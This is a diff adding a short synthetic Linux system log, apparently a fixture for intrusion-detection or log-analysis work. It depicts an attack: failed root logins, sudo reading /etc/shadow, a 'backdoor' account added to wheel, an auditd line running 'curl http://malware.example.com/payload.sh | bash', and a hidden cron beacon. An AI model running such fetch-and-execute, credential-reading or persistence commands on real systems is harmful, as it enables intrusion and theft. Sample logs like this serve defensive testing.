@@ -1,0 +1,15 @@
+Apr 28 15:17:00 linuxserver01 sshd[12345]: Accepted publickey for jsmith from 192.168.1.105 port 54321 ssh2: RSA SHA256:abcdefghijklmnopqrstuvwxyz1234567890ABCD
+Apr 28 15:17:15 linuxserver01 sshd[12346]: Failed password for root from 203.0.113.45 port 45678 ssh2
+Apr 28 15:17:30 linuxserver01 sshd[12346]: Failed password for root from 203.0.113.45 port 45679 ssh2
+Apr 28 15:17:45 linuxserver01 sshd[12346]: Failed password for root from 203.0.113.45 port 45680 ssh2
+Apr 28 15:18:00 linuxserver01 sudo: jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Apr 28 15:18:15 linuxserver01 sudo: mwilson : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/mwilson ; USER=root ; COMMAND=/bin/bash
+Apr 28 15:18:30 linuxserver01 useradd[23456]: new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor, shell=/bin/bash
+Apr 28 15:18:45 linuxserver01 usermod[23457]: add 'backdoor' to group 'wheel'
+Apr 28 15:19:00 linuxserver01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e:00:6f:7a:8b:9c:ad:08:00 SRC=203.0.113.100 DST=192.168.10.25 LEN=60 TOS=0x00 PREC=0x00 TTL=49 ID=12345 DF PROTO=TCP SPT=45678 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0
+Apr 28 15:19:15 linuxserver01 auditd[1234]: EXECVE argc=3 a0="/bin/bash" a1="-c" a2="curl http://malware.example.com/payload.sh | bash"
+Apr 28 15:19:30 linuxserver01 systemd[1]: Started malicious.service - Suspicious Background Service.
+Apr 28 15:19:45 linuxserver01 cron[34567]: (root) CMD (/tmp/.hidden/beacon.sh)
+Apr 28 15:20:00 linuxserver01 passwd[45678]: password changed for jsmith by root
+Apr 28 15:20:15 linuxserver01 sshd[12347]: Received disconnect from 192.168.1.105 port 54321:11: disconnected by user
+Apr 28 15:20:30 linuxserver01 kernel: [UFW ALLOW] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e:00:6f:7a:8b:9c:ad:08:00 SRC=192.168.1.100 DST=192.168.10.25 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=23456 DF PROTO=TCP SPT=51234 DPT=443 WINDOW=65535 RES=0x00 SYN URGP=0
